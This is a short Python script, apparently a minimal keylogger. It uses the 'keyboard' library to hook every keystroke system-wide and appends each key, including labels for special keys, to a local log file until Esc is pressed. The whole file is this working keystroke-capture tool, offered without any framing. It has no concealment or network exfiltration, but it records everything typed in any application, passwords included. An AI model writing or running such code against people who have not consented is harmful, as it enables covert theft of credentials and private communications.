import keyboard

def log_keystrokes(event):
    key = event.name
    if len(key) > 1:
        # Special keys like 'enter', 'shift', etc.
        if key == "enter":
            key = '\n'
        elif key == "space":
            key = ' '
        else:
            key = f"[{key}]"
    with open("keystrokes_log.txt", "a") as log_file:
        log_file.write(key)

keyboard.hook(log_keystrokes)
keyboard.wait("esc")  # Wait for the user to press the 'esc' key to exit the program
